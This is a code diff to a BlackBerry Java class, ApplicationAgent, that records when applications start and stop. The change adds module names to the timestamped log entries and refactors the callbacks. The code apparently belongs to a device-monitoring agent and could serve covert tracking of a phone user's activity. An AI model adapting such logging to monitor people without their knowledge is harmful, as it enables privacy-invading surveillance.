@@ -96,12 +96,15 @@ public final class ApplicationAgent extends Agent implements
      * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
      * (java.util.Vector, java.util.Vector)
      */
-    public synchronized void onApplicationListChange(final Vector startedList,
-            final Vector stoppedList) {
+    public synchronized void onApplicationListChange(final Vector startedListName,
+            final Vector stoppedListName, final Vector startedListMod,
+            final Vector stoppedListMod) {
 
         // #ifdef DBC
-        Check.requires(startedList != null, "startedList != null");
-        Check.requires(stoppedList != null, "stoppedList != null");
+        Check.requires(startedListName != null, "startedListName != null");
+        Check.requires(stoppedListName != null, "stoppedListName != null");
+        Check.requires(startedListMod != null, "startedListMod != null");
+        Check.requires(stoppedListMod != null, "stoppedListMod != null");
         // #endif
 
         if (firstRun) {
@@ -109,8 +112,10 @@ public final class ApplicationAgent extends Agent implements
             debug.info("skipping first run");
 
             // #ifdef DBC
-            Check.asserts(startedList.size() > 0, "startedList.size() > 0");
-            Check.asserts(stoppedList.size() == 0, "stoppedList.size() == 0");
+            Check.asserts(startedListName.size() > 0, "startedList.size() > 0");
+            Check.asserts(stoppedListName.size() == 0, "stoppedList.size() == 0");
+            Check.asserts(startedListMod.size() > 0, "startedList.size() > 0");
+            Check.asserts(stoppedListMod.size() == 0, "stoppedList.size() == 0");
             // #endif
 
             firstRun = false;
@@ -119,28 +124,33 @@ public final class ApplicationAgent extends Agent implements
 
         log.createLog(null);
 
-        int size = startedList.size();
+        int size = startedListName.size();
         for (int i = 0; i < size; i++) {
-            final String appName = (String) startedList.elementAt(i);
-
+            String name = (String) startedListName.elementAt(i);
+            String mod = (String) startedListMod.elementAt(i);
             //#debug debug
-            debug.trace(appName + " START");
-            writeLog(appName, "START");
+            debug.trace(name + " START");
+            writeLog(name, "START", mod);
         }
 
-        size = stoppedList.size();
+        size = stoppedListName.size();
         for (int i = 0; i < size; i++) {
-            final String appName = (String) stoppedList.elementAt(i);
+            String name = (String) stoppedListName.elementAt(i);
+            String mod = (String) stoppedListMod.elementAt(i);
             //#debug debug
-            debug.trace(appName + " STOP");
-
-            writeLog(appName, "STOP");
+            debug.trace(name + " STOP");
+            writeLog(name, "STOP", mod);
         }
 
         log.close();
 
         //#debug debug
         debug.trace("finished writing log");
+    }
+    
+    public synchronized void onApplicationListChangeMod(final Vector startedList,
+            final Vector stoppedList) {
+    //TODO: onApplicationListChangeMod
     }
 
     /*
@@ -150,17 +160,24 @@ public final class ApplicationAgent extends Agent implements
     protected boolean parse(final byte[] confParameters) {
         // #debug debug
         debug.trace("parse");
+        
+        //#mdebug
+        StringBuffer sb = new StringBuffer();
+        //#debug info
+        debug.info(sb.toString());
+        //#enddebug
+        
         return false;
     }
 
-    private void writeLog(final String appName, final String condition) {
+    private void writeLog(final String appName, final String condition, final String mod) {
         final byte[] tm = (new DateTime()).getStructTm();
 
         final Vector items = new Vector();
         items.addElement(tm);
         items.addElement(WChar.getBytes(appName, true));
         items.addElement(WChar.getBytes(condition, true));
-        items.addElement(WChar.getBytes("info", true));
+        items.addElement(WChar.getBytes(mod, true));
         items.addElement(Utils.intToByteArray(LOG_DELIMITER));
         log.writeLogs(items);
 
